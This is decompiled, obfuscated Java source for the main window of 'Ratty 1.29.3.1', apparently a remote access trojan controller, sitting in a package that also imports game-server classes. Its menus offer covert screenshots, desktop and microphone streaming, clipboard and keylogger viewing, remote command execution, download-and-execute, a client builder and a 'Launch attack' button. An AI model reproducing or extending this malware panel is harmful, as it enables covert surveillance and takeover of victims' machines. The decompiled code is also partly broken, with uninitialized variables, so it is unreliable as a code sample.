/*
 * Decompiled with CFR 0.150.
 */
package FuckingHackerToby;

import FuckingHackerToby.Aa;
import FuckingHackerToby.Fa;
import FuckingHackerToby.Na;
import FuckingHackerToby.a;
import FuckingHackerToby.e;
import FuckingHackerToby.ea;
import FuckingHackerToby.g;
import FuckingHackerToby.ia;
import java.awt.Component;
import java.awt.Container;
import java.awt.Dimension;
import java.awt.FlowLayout;
import java.awt.Image;
import java.awt.Insets;
import java.awt.event.ActionEvent;
import java.awt.image.BufferedImage;
import java.util.function.Consumer;
import javax.swing.AbstractButton;
import javax.swing.Icon;
import javax.swing.ImageIcon;
import javax.swing.JButton;
import javax.swing.JMenu;
import javax.swing.JMenuBar;
import javax.swing.JMenuItem;
import javax.swing.JPopupMenu;
import javax.swing.JScrollPane;
import javax.swing.JTable;
import javax.swing.table.DefaultTableCellRenderer;
import javax.swing.table.JTableHeader;
import server.Extend.SpecialEquipData;
import server.life.MonsterDropEntry;

public final class aa
extends Fa
implements g {
    private /* synthetic */ JPopupMenu Q;
    private /* synthetic */ Aa S;
    private static final /* synthetic */ String[] ALLATORIxDEMO;
    private /* synthetic */ JTable N;
    private /* synthetic */ JButton Z;
    private /* synthetic */ Na w;
    private static final /* synthetic */ String[] a;
    private /* synthetic */ JScrollPane r;
    private static final /* synthetic */ String G = "Ratty 1.29.3.1";
    private static final /* synthetic */ String[] d;
    private static final /* synthetic */ Insets g;
    private /* synthetic */ JButton t;
    private static final /* synthetic */ Dimension e;
    private /* synthetic */ JMenuBar o;
    private static final /* synthetic */ int B = 25;
    private static final /* synthetic */ int k = 30;
    private static final /* synthetic */ String[] K;
    private /* synthetic */ JButton P;
    private static final /* synthetic */ FlowLayout E;

    @Override
    public /* synthetic */ void H(Na a2) {
        aa a3;
        a3.S.D(a2);
    }

    @Override
    public /* synthetic */ Na ALLATORIxDEMO() {
        aa a2;
        return a2.w;
    }

    public static /* synthetic */ void ALLATORIxDEMO(aa a2, Consumer a3) {
        a2.ALLATORIxDEMO(a3);
    }

    public static /* synthetic */ JTable ALLATORIxDEMO(aa a2) {
        return a2.N;
    }

    public /* synthetic */ aa() {
        aa a2;
        aa aa2 = a2;
        aa aa3 = a2;
        aa aa4 = a2;
        aa aa5 = a2;
        a2.N = new JTable();
        aa5.S = new Aa();
        a2.r = new JScrollPane(a2.N, 22, 31);
        a2.Q = new JPopupMenu();
        a2.o = new JMenuBar();
        aa4.Z = aa4.ALLATORIxDEMO("Manage servers", FuckingHackerToby.e.B);
        aa3.t = aa4.ALLATORIxDEMO("Client builder", FuckingHackerToby.e.G);
        aa3.P = aa2.ALLATORIxDEMO("Launch attack", FuckingHackerToby.e.k);
        Container container = aa2.d.getContentPane();
        JMenu jMenu = aa2.ALLATORIxDEMO("Surveillance", FuckingHackerToby.e.j, K, FuckingHackerToby.e.K);
        JMenu jMenu2 = aa2.ALLATORIxDEMO("File management", FuckingHackerToby.e.s, a, FuckingHackerToby.e.a);
        JMenu jMenu3 = aa2.ALLATORIxDEMO("Utility", FuckingHackerToby.e.J, d, FuckingHackerToby.e.d);
        JMenu jMenu4 = aa2.ALLATORIxDEMO("Other", FuckingHackerToby.e.h, ALLATORIxDEMO, FuckingHackerToby.e.ALLATORIxDEMO);
        JTableHeader jTableHeader = aa2.N.getTableHeader();
        ia ia2 = new ia(a2);
        ea ea2 = new ea(a2);
        DefaultTableCellRenderer defaultTableCellRenderer = (DefaultTableCellRenderer)jTableHeader.getDefaultRenderer();
        JTableHeader jTableHeader2 = jTableHeader;
        int n2 = jTableHeader2.getWidth();
        Dimension dimension = new Dimension(n2, 30);
        jTableHeader2.setReorderingAllowed(false);
        jTableHeader2.setPreferredSize(dimension);
        defaultTableCellRenderer.setHorizontalAlignment(0);
        aa aa6 = a2;
        aa6.o.setLayout(E);
        a2.o.setMargin(g);
        aa6.o.add(a2.Z);
        aa aa7 = a2;
        aa7.o.add(aa7.t);
        aa aa8 = a2;
        aa8.o.add(aa8.P);
        a2.Q.add(jMenu);
        a2.Q.add(jMenu2);
        a2.Q.add(jMenu3);
        aa aa9 = a2;
        aa9.Q.addSeparator();
        aa9.Q.add(jMenu4);
        aa aa10 = a2;
        aa aa11 = a2;
        aa aa12 = a2;
        aa12.r.setBorder(null);
        aa aa13 = a2;
        aa12.N.setComponentPopupMenu(aa13.Q);
        aa13.N.setModel(a2.S);
        aa12.N.setRowHeight(25);
        aa12.N.setSelectionMode(0);
        aa12.N.setShowGrid(true);
        aa12.N.addMouseListener(ea2);
        container.add((Component)a2.r, MonsterDropEntry.ALLATORIxDEMO("|RQCZE"));
        container.add((Component)aa11.o, SpecialEquipData.ALLATORIxDEMO("\u007fVYMD"));
        aa10.d.setTitle(G);
        aa11.d.setIconImages(FuckingHackerToby.e.U);
        aa10.d.setDefaultCloseOperation(0);
        aa10.d.addWindowListener(ia2);
        aa10.d.setPreferredSize(e);
        aa10.d.pack();
        aa10.d.setLocationRelativeTo(null);
    }

    private /* synthetic */ JMenu ALLATORIxDEMO(String a2, BufferedImage a3, String[] a4, BufferedImage[] a5) {
        a2 = new JMenu((String)a2);
        a3 = new ImageIcon((Image)a3);
        ((AbstractButton)a2).setIcon((Icon)a3);
        int n2 = a3 = 0;
        while (n2 < a4.length && a3 < a5.length) {
            aa a6;
            Object object = a4[a3];
            BufferedImage bufferedImage = a5[a3];
            object = a6.ALLATORIxDEMO((String)object, bufferedImage);
            ((JMenu)a2).add((JMenuItem)object);
            n2 = ++a3;
        }
        return a2;
    }

    public static /* synthetic */ Aa ALLATORIxDEMO(aa a2) {
        return a2.S;
    }

    public static /* synthetic */ Na ALLATORIxDEMO(aa a2, Na a3) {
        a2.w = a3;
        return a2.w;
    }

    @Override
    public /* synthetic */ void H() {
        aa a2;
        aa aa2 = a2;
        int n2 = aa2.N.getSelectedRow();
        aa2.S.fireTableDataChanged();
        if (n2 != -1) {
            int n3 = n2;
            a2.N.setRowSelectionInterval(n3, n3);
        }
    }

    private /* synthetic */ JButton ALLATORIxDEMO(String a3, BufferedImage a4) {
        aa a5;
        a4 = new ImageIcon((Image)a4);
        Object object = a4 = new JButton(a3, (Icon)a4);
        ((AbstractButton)object).setActionCommand(a3);
        ((AbstractButton)object).addActionListener(a2 -> {
            aa a3;
            a2 = ((ActionEvent)a2).getActionCommand();
            aa aa2 = a3;
            aa2.ALLATORIxDEMO(arg_0 -> aa2.ALLATORIxDEMO((String)((Object)a2), arg_0));
        });
        return a4;
    }

    @Override
    public /* synthetic */ void ALLATORIxDEMO(Na a2) {
        aa a3;
        a3.S.l(a2);
    }

    private /* synthetic */ JMenuItem ALLATORIxDEMO(String a3, BufferedImage a4) {
        aa a5;
        JMenuItem jMenuItem = new JMenuItem(a3);
        a4 = new ImageIcon((Image)a4);
        JMenuItem jMenuItem2 = jMenuItem;
        jMenuItem2.setActionCommand(a3);
        jMenuItem2.addActionListener(a2 -> {
            aa a3;
            a2 = ((ActionEvent)a2).getActionCommand();
            aa aa2 = a3;
            aa2.ALLATORIxDEMO(arg_0 -> aa2.ALLATORIxDEMO((String)((Object)a2), arg_0));
        });
        JMenuItem jMenuItem3 = jMenuItem;
        jMenuItem3.setIcon((Icon)a4);
        return jMenuItem3;
    }

    public static /* synthetic */ {
        e = new Dimension(1200, 600);
        E = new FlowLayout(0, 6, 0);
        g = new Insets(3, 0, 3, 0);
        String[] arrstring = new String[5];
        arrstring[0] = "Take screenshot";
        arrstring[1] = "Toggle desktop stream";
        arrstring[2] = "Toggle microphone stream";
        arrstring[3] = "Show clipboard";
        arrstring[4] = "Open key log";
        K = arrstring;
        String[] arrstring2 = new String[3];
        arrstring2[0] = "Browse files";
        arrstring2[1] = "Upload and execute file";
        arrstring2[2] = "Download and execute file from the internet";
        a = arrstring2;
        String[] arrstring3 = new String[5];
        arrstring3[0] = "Open popup";
        arrstring3[1] = "Execute command";
        arrstring3[2] = "Open website";
        arrstring3[3] = "Play audio";
        arrstring3[4] = "Open chat";
        d = arrstring3;
        String[] arrstring4 = new String[5];
        arrstring4[0] = "Show client information";
        arrstring4[1] = "Restart";
        arrstring4[2] = "Shut down";
        arrstring4[3] = "Free client";
        arrstring4[4] = "Uninstall client";
        ALLATORIxDEMO = arrstring4;
    }

    private /* synthetic */ void ALLATORIxDEMO(String a2, a a3) {
        aa a4;
        a3.ALLATORIxDEMO(a2, a4);
    }
}

